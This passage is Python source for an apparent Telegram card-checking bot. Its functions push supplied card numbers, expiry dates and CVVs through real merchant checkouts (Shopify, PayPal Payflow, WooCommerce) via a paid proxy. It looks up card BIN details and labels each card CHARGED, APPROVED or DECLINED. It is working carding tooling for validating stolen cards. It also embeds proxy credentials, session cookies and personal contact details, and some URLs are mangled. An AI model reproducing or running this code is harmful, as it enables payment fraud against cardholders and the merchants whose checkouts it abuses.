__typename}...on AutomaticDiscount{presentationLevel title allocationMethod targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
    'variables': {
        'receiptId': receipt_id,
        'sessionToken': x_checkout_one_session_token,
    },
    'operationName': 'PollForReceipt',
}

    response2 = r.post("https://www.popforacause.org/checkouts/unstable/graphql", headers=headers9,json=json_data9, proxies=proxies)
    print(response2.text)

    msg = find_between(response2.text, '"code":"', '"')
    print(msg)

    first6 = cc[:6]

    response = r.get(f"https://bins.antipublic.cc/bins/{first6}", headers=headers, proxies=proxies)
    data = json.loads(response.text)

    binn = data["bin"]
    brand = data["brand"]
    country = data["country"]
    bank = data["bank"]
    level = data["level"]
    card_type = data["type"]
    flag = data["country_flag"]
    currencies2 = ', '.join(data["country_currencies"])

    if any(substring in response2.text for substring in ["Thank you for your purchase!", "Order #", "Your order is confirmed", "CARD_SUCCEEDED", "CARD_APPROVED", "PaymentSucceeded", "PaymentApproved", "PaymentCompleted", "CARD_COMPLETED", "CARD_SUCCESS", "SucceededReceipt", "ApprovedReceipt", '"redirectUrl":"',"PurchaseOrder","thank_you"]):

        return f"✫ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝟱$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: Thank you for your purchase!\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CHARGED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"

    if any(substring in response2.text for substring in [ "INCORRECT_CVC","ActionRequiredReceiptTimeout"]):
        return f"✫ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝟱$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `INVALID_CVC`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CCN APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"

    elif "INVALID_CVC" in msg:

        return f"✫ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝟱$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CCN APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "Completing a captcha is required for this checkout." in response2.text:

        return f"✫ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝟱$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: CAPCTHA ENABLED\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"

    elif "BILLING" in msg:

        return f"✫ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝟱$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "Your card does not support this type of purchase." in msg:

        return f"✫ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝟱$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"

    elif "Your card has insufficient funds." in msg:

        return f"✫ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝟱$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    else:
        return f"✫ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝟱$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `DECLINED 🔴`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"


def  payflowsega(cc, mes, ano, cvv):
    session = requests.Session()
    proxies = {
     "http":"http://country-worldwide:25e88524-5849-48bd-9386-f7bab933c7e0@proxy.proxyverse.io:9200"
    }
    req1 = session.get("https://www.carolina.com/", proxies=proxies)
    req1.raise_for_status()

    req2 = session.post("https://www.carolina.com/checkout/billing.jsp", proxies=proxies)
    req2.raise_for_status()
    texto_1 = req2.text
    _dynSessConf = capture(texto_1, '<input name="_dynSessConf" type="hidden" value="', '"')

    headers = {
        "Accept": "text/json",
        "Accept-Language": "es-ES,es;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.carolina.com",
        "Referer": "https://www.carolina.com/checkout/billing.jsp?_requestid=797580",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-gpc": "1",
    }

    params = {
        "_requestid": "797580",
    }

    data = {
        "_dyncharset": "UTF-8",
        "_dynSessConf": _dynSessConf,
        "/atg/commerce/order/purchase/PaymentGroupFormHandler.updateAddressErrorURL": "/checkout/billing.jsp",
        "_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.updateAddressErrorURL": " ",
        "/atg/commerce/order/purchase/PaymentGroupFormHandler.updateAddressSuccessURL": "/checkout/review.jsp",
        "_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.updateAddressSuccessURL": " ",
        "/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPaymentGroupsSuccessURL": "/checkout/review.jsp",
        "_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPaymentGroupsSuccessURL": " ",
        "/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPaymentGroupsErrorURL": "/checkout/billing.jsp",
        "_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPaymentGroupsErrorURL": " ",
        "firstName": "Ales",
        "_D:firstName": " ",
        "lastName": "Pro",
        "_D:lastName": " ",
        "address1": "192 ALLEN ST",
        "_D:address1": " ",
        "postalCode": "06053-3056",
        "_D:postalCode": " ",
        "/atg/commerce/order/purchase/PaymentGroupFormHandler.zipcodeApiResponseCode": "0",
        "_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.zipcodeApiResponseCode": " ",
        "city": "NEW BRITAIN",
        "_D:city": " ",
        "_D:state": " ",
        "state": "CT",
        "userTypingInterval": "300",
        "/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPayPalPayment": "true",
        "_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPayPalPayment": " ",
        "_DARGS": "/checkout/gadgets/billing-form.jsp.billing_addr_form",
    }

    req3 = session.post("https://www.carolina.com/checkout/billing.jsp", params=params, headers=headers, data=data, proxies=proxies)
    req3.raise_for_status()
    texto_2 = req3.text
    securetoken = capture(texto_2, "SECURETOKEN=", "&").strip()
    securetokenid = capture(texto_2, "SECURETOKENID=", "&").strip()

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "es-ES,es;q=0.9",
        "Connection": "keep-alive",
        "Referer": "https://www.carolina.com/",
        "Sec-Fetch-Dest": "iframe",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-gpc": "1",
    }

    params = {
        "RESULT": "0",
        "SECURETOKEN": securetoken,
        "SECURETOKENID": securetokenid,
        "RESPMSG": "Approved",
    }

    req4 = session.get("https:// 𝗣𝗔𝗬𝗙𝗟𝗢𝗪 link.paypal.com/", params=params, headers=headers, proxies=proxies)
    req4.raise_for_status()
    texto_3 = req4.text
    csfr_token = capture(texto_3, '<input name="CSRF_TOKEN" type="hidden" value="', '"')

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "es-ES,es;q=0.9",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https:// 𝗣𝗔𝗬𝗙𝗟𝗢𝗪 link.paypal.com",
        "Referer": f"https:// 𝗣𝗔𝗬𝗙𝗟𝗢𝗪 link.paypal.com/?RESULT=0&SECURETOKEN={securetoken}&SECURETOKENID={securetokenid}&RESPMSG=Approved",
        "Sec-Fetch-Dest": "iframe",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-gpc": "1",
    }

    data = {
        "subaction": "",
        "CARDNUM": cc,
        "EXPMONTH": mes,
        "EXPYEAR": ano,
        "CVV2": cvv,
        "startdate_month": "",
        "startdate_year": "",
        "issue_number": "",
        "METHOD": "C",
        "PAYMETHOD": "C",
        "FIRST_NAME": "Ales",
        "LAST_NAME": "Pro",
        "template": "",
        "ADDRESS": "192 ALLEN ST",
        "CITY": "NEW BRITAIN",
        "STATE": "CT",
        "ZIP": "060533056",
        "COUNTRY": "US",
        "PHONE": "",
        "EMAIL": "",
        "SHIPPING_FIRST_NAME": "",
        "SHIPPING_LAST_NAME": "",
        "ADDRESSTOSHIP": "",
        "CITYTOSHIP": "",
        "STATETOSHIP": "",
        "ZIPTOSHIP": "",
        "COUNTRYTOSHIP": "",
        "PHONETOSHIP": "",
        "EMAILTOSHIP": "",
        "TYPE": "A",
        "SHIPAMOUNT": "0.00",
        "TAX": "0.00",
        "VERBOSITY": "HIGH",
        "flag3dSecure": "",
        "STATE": "CT",
        "swipeData": "0",
        "SECURETOKEN": securetoken,
        "SECURETOKENID": securetokenid,
        "PARMLIST": "",
        "MODE": "",
        "CSRF_TOKEN": csfr_token,
        "referringTemplate": "minlayout",
    }

    req5 = session.post("https:// 𝗣𝗔𝗬𝗙𝗟𝗢𝗪 link.paypal.com/processTransaction.do", headers=headers, data=data, proxies=proxies)
    req5.raise_for_status()
    texto_4 = req5.text
    msj = capture(texto_4, '<input type="hidden" name="RESPMSG" value="', '"')
    cvcode = capture(texto_4, '<input type="hidden" name="PROCCVV2" value="', '"')
    avscode = capture(texto_4, '<input type="hidden" name="PROCAVS" value="', '"')
    print(texto_4)

    first6 = cc[:6]

    response = session.get(f"https://bins.antipublic.cc/bins/{first6}", headers=headers, proxies=proxies)
    data = json.loads(response.text)

    binn = data["bin"]
    brand = data["brand"]
    country = data["country"]
    bank = data["bank"]
    level = data["level"]
    card_type = data["type"]
    flag = data["country_flag"]
    currencies2 = ', '.join(data["country_currencies"])

    if "CVV2 Mismatch" in msj:

        return f"✫ 𝗣𝗔𝗬𝗙𝗟𝗢𝗪 ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msj}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CCN APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "Declined" in msj:
        return f"✫ 𝗣𝗔𝗬𝗙𝗟𝗢𝗪 ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msj}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `DECLINED 🔴`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "Declined by Fraud Service." in msj:
        return f"✫ 𝗣𝗔𝗬𝗙𝗟𝗢𝗪 ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msj}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `DECLINED 🔴`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "Fraudulent activity detected: Excessive use of a credit card." in msj:
        return f"✫ 𝗣𝗔𝗬𝗙𝗟𝗢𝗪 ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msj}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `DECLINED 🔴`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "ERROR" in msj:
        return f"✫ 𝗣𝗔𝗬𝗙𝗟𝗢𝗪 ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msj}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `DECLINED 🔴`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "Invalid account number" in msj:
        return f"✫ 𝗣𝗔𝗬𝗙𝗟𝗢𝗪 ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msj}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `DECLINED 🔴`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "Invalid expiration date" in msj:
        return f"✫ 𝗣𝗔𝗬𝗙𝗟𝗢𝗪 ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msj}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `DECLINED 🔴`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    else:

        return f"✫ 𝗣𝗔𝗬𝗙𝗟𝗢𝗪 ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: Payment Succeeded\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CHARGED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"

def stripe2(cc, mes, ano, cvv):
    r = requests.Session()

    headers = {
     'authority': 'iaddcart.com',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
     # 'cookie': 'current_cur=USD; wp_woocommerce_session_158186d545f87dd4260f2e2746524611=t_59a874be755c409d10d6b4e1befa70%7C%7C1711131456%7C%7C1711127856%7C%7C98eff1bb98e79ad11d418ebb63627eae; woocommerce_recently_viewed=4920',
     'origin': 'https://iaddcart.com',
     'referer': 'https://iaddcart.com/product/1pc-reusable-beer-water-dispenser-lid-plastic-protector-caps-cover-bottle-top-soda-saver-can-cap-useful-creative-accessories/?attribute_pa_color=1pcs-random-color',
     'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
     'x-requested-with': 'XMLHttpRequest',
    }

    data = {
     'action': 'kapee_ajax_add_to_cart',
     'add-to-cart': '4920',
     'attribute_pa_color': '1pcs-random-color',
     'quantity': '1',
     'product_id': '4920',
     'variation_id': '4921',
    }

    response = r.post('https://iaddcart.com/wp-admin/admin-ajax.php', headers=headers, data=data, proxies=proxies)
    rs2 = r.get('https://iaddcart.com/checkout/', headers=headers, proxies=proxies)
    rs2_text = rs2.text
    non = find_between(rs2_text, 'id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="', '"',)
    non2 = find_between(rs2_text, '?wc-ajax=ppc-create-order","nonce":"', '"',)

    headers3 = {
     'authority': 'iaddcart.com',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
     'content-type': 'application/json',
     # 'cookie': 'current_cur=USD; wp_woocommerce_session_158186d545f87dd4260f2e2746524611=t_59a874be755c409d10d6b4e1befa70%7C%7C1711131456%7C%7C1711127856%7C%7C98eff1bb98e79ad11d418ebb63627eae; woocommerce_recently_viewed=4920; woocommerce_items_in_cart=1',
     'origin': 'https://iaddcart.com',
     'referer': 'https://iaddcart.com/checkout/',
     'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    }


    json_data = {
     'nonce': non2,
     'payer': None,
     'bn_code': 'Woo_PPCP',
     'context': 'checkout',
     'order_id': '0',
     'payment_method': 'ppcp-gateway',
     'funding_source': 'card',
     'form_encoded': 'billing_first_name=techno&billing_last_name=tinker&billing_company=&billing_country=US&billing_address_1=3448+Ile+De+France+St+%23242&billing_address_2=&billing_state=AK&billing_city=Fort+Wainwright&billing_postcode=99611&billing_phone=7488810567&billing_email=technotinker2020%40gmail.com&billing_rut=&billing_cpf=&billing_t_id=&shipping_first_name=techno&shipping_last_name=tinker&shipping_company=&shipping_country=US&shipping_address_1=3448+Ile+De+France+St+%23242&shipping_address_2=&shipping_state=AK&shipping_city=Fort+Wainwright&shipping_postcode=99611&shipping_phone=7488810567&shipping_rut=&shipping_cpf=&shipping_t_id=&order_comments=&shipping_method%5B0%5D=free_shipping%3A1&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={non}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
     'createaccount': False,
     'save_payment_method': False,
    }

    rs3 = r.post('https://iaddcart.com/?wc-ajax=ppc-create-order', headers=headers3, json=json_data, proxies=proxies)
    rs3_text = rs3.text
    orderid = find_between(rs3_text, '"id":"', '","',)

    headers4 = {
     'authority': 'www.paypal.com',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
     'content-type': 'application/json',
     # 'cookie': 'cookie_check=yes; d_id=5bbb4c79e5394de4af40a5ec6d1989d01695305923477; cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; pi_opt_in925803=true; visitor_id925803-hash=53f03278b90950709d6aa37c0f5f96f22bd95df58f3bc1383b881f24c2e60bf3c9b8359b32f8def65bef94cccb7dde5d876a61b9; visitor_id925803=2867413464; ui_experience=login_type%3DEMAIL_PASSWORD%26home%3D3%26ph_conf%3D2%253A1702550395137; consumer_display=USER_HOMEPAGE%3d0%26USER_TARGETPAGE%3d0%26USER_FILTER_CHOICE%3d0%26BALANCE_MODULE_STATE%3d1%26GIFT_BALANCE_MODULE_STATE%3d1%26LAST_SELECTED_ALIAS_ID%3d0%26SELLING_GROUP%3d1%26PAYMENT_AND_RISK_GROUP%3d1%26SHIPPING_GROUP%3d1%26MCE2_ELIGIBILITY%3d0; navlns=0.0; enforce_policy=ccpa; rmuc=IUPCiv2W68Rpx-1qGQnjsEy8j0MXCa_bpsBwPTCCiOuMb2GOTSlJnMFn62X1nTPooRco7EbyKebVTaWTKL8icuuWdTpKrZLUbcEjee_GlIXnYZmwfZ0dB18ZBMNxyOzR61JeW1KYRfr1s5oRqi2b1eKGVobn_Aer8GPxE4KUhDgFLK78FnQMjiUsM4xaK9E_Koeua0; X-PP-ADS=AToBbKFlZdso2xAQ7ivevNbPg5EB8aU7ATQX42XM4P78qhUzIJRKZKis538I; login_email=technotinker2020%40gmail.com; KHcl0EuY7AKSMgfvHl7J5E7hPtK=kHjzpYAtbFu4zrMsekAvD3MceT31KlJDQKIJB-iu9_xNtYiOFlkXrGlVmXGyNm3ZZvricNtZYACQXB-U; sc_f=kCDdM20qFsCk2Z2bzBgBNj6SdAWApCTSEcApMhR3Wxx5YvRpWQZ5aJPo1jWPfpNbq-ZS61kYr3FhheSTS4MY4UaaVpLy7aPkc7sSI0; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IlpLaW9lanBLcUhZcld1ZEpPSUtqakhWSHFHOFdiTWJ0Y2Nhd052VGNsUkc2ZFNuUmpBRUswVVN3bHB5MUt1czd6N0RYY3RaYW1xTEtLb3gwcm9MQmxXODQ0b1hZZTBFUVlzaGVyVW9vajg4aTNUdEZMbDcyclRDVlU3YmFJUTA2YTE3dWdxcTZuTkNqVDlQZjJnM2dJWUtaUUVRUVlZOTZwS2F4MUQ3UjZ0di1tQWlhOVpQN2ZDSmJZYkciLCJpYXQiOjE3MTEwMzE1MTYsImV4cCI6MTcxMTAzNTExNn0.bkUsG8YLspdoCNEEUhgNYZ_8n308HHt5niC_-CO0Etg; ts_c=vr%3D9d90051118a0a5b0e874741aff5c0fdc%26vt%3D61bb25b618e0a550403a1cd1fd9bacbf; nsid=s%3Arj_8YNs48rRlndNGI1Kixfbz1qXku6Bk.y7lPhvvwDEh4aa3EqeiWOTZf1yJAFcko%2BX9AxW6Pg6o; LANG=en_US%3BUS; AV894Kt2TSumQQrJwe-8mzmyREO=S23AAMib1X2qlFmsoHO5Q9b3nd-DFBN7seST7CbCDZkmHgIIo7Asth88LmU9vMKcIsnvtzTWDDPJXho2PoFgTGpNflXZuHwfg; rssk=d%7DC9%407458%3C1%3D7A%3B8%3Exqx%3Eop%C2%81%C2%83%7Bw%3A8%3F11; l7_az=dcg14.slc; x-pp-s=eyJ0IjoiMTcxMTAzODE2NjQ1OCIsImwiOiIwIiwibSI6IjAifQ; tsrce=graphqlnodeweb; ts=vreXpYrS%3D1805646166%26vteXpYrS%3D1711039966%26vr%3D9d90051118a0a5b0e874741aff5c0fdc%26vt%3D61bb25b618e0a550403a1cd1fd9bacbf%26vtyp%3Dreturn',
     'origin': 'https://www.paypal.com',
     'paypal-client-context': "{orderid}",
     'paypal-client-metadata-id': "{orderid}",
